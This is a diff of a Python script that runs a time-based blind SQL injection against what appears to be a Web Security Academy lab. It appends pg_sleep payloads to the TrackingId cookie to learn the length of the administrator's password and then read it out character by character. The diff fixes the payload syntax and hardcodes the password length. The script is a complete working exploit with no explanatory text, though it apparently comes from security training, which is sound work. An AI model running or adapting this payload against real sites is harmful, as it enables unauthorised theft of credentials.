@@ -1,11 +1,10 @@
-# Fetching data using timedelay property....................
 import requests
-url = "https://0aea008104c3f13782674783000800aa.web-security-academy.net/filter?category=Pets"
+url = "https://0a1800b904119f7180ab6c5000ba00e8.web-security-academy.net/filter?category=Gifts"
 characters ="abcdefghijklmnopqrstuvwxyz1234567890"
 
 def get_len():
     for i in range(1,101):
-        cookie = {'TrackingId':'hRcGp8XoPc4WhWuU', 'session':'Dop8uE0KkIbybO1kip4sbFNb8pqxKKST'}
+        cookie = {'TrackingId':'1Is0UOBkxmJcbERi', 'session':'UL9MqRkZPiFr71SXeKsXXMovbwE5X5Lv'}
         payload = f"' || CASE WHEN (LENGTH((SELECT password from users where username = 'administrator'))={i}) THEN pg_sleep(10) ELSE pg_sleep(0) END --"
         cookie['TrackingId']= cookie['TrackingId']+payload
         r = requests.get(url, cookies = cookie)
@@ -16,18 +15,19 @@ def get_data(length):
     temp= ""
     for i in range(1,length+1):
         for char in characters:
-            cookie = {'TrackingId':'hRcGp8XoPc4WhWuU', 'session':'Dop8uE0KkIbybO1kip4sbFNb8pqxKKST'}
-            payload = f"' || CASE WHEN ((SUBSTRING((SELECT password from users where username = 'administrator')),{i},1)='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END --"
+            cookie = {'TrackingId':'1Is0UOBkxmJcbERi', 'session':'UL9MqRkZPiFr71SXeKsXXMovbwE5X5Lv'}
+            payload = f"' ||CASE WHEN ((SUBSTRING((SELECT password from users where username = 'administrator'),{i},1))='{char}') THEN pg_sleep(5) ELSE pg_sleep(0) END --"
             cookie['TrackingId']= cookie['TrackingId']+payload
             r = requests.get(url, cookies = cookie)
-            if r.elapsed.total_seconds()>3:
+            if r.elapsed.total_seconds()>5:
                 temp += char
                 print(temp)
+                break
     return temp
 
 
 print("Checking Password length... Please be patient.")
-length = get_len()
+length = 20
 print(f"Password length: {length}")
 print("Dumping Data... Please be patient.")
 data = get_data(length)
